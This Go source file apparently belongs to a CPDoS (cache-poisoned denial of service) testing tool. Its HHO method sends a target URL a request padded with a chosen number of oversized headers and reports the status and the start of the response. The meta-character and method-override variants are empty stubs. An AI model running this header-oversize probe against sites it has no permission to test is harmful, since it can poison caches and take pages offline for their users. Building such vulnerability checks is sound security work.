package internal

import (
	"strconv"

	"github.com/naiba/com"
	"github.com/parnurzeal/gorequest"
)

// CPDoSExp CPDoS测试工具
type CPDoSExp struct {
	URL string
	req *gorequest.SuperAgent
}

// NewCPDoSExp ...
func NewCPDoSExp(url string) *CPDoSExp {
	return &CPDoSExp{
		URL: url,
		req: gorequest.New(),
	}
}

func (ce *CPDoSExp) preClear() {
	ce.req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36")
}

// Get ..
func (ce *CPDoSExp) Get() (string, int) {
	ce.preClear()
	return ce.formatResp(ce.req.Get(ce.URL).End())
}

// HHO HTTP Header Oversize
func (ce *CPDoSExp) HHO(num int) (string, int) {
	ce.preClear()
	for i := 0; i < num; i++ {
		iStr := strconv.Itoa(i)
		ce.req.AppendHeader("X-CPDoS-Header-"+iStr, "Session-Value-"+com.MD5(iStr))
	}
	return ce.formatResp(ce.req.Get(ce.URL).End())
}

func (ce *CPDoSExp) formatResp(resp gorequest.Response, body string, errs []error) (string, int) {
	if errs != nil {
		return errs[0].Error(), 0
	}
	if len(body) > 200 {
		body = body[:200]
	}
	return body, resp.StatusCode
}

// HMC HTTP Meta Character
func (ce *CPDoSExp) HMC() {

}

// HMO HTTP Method Override
func (ce *CPDoSExp) HMO() {

}
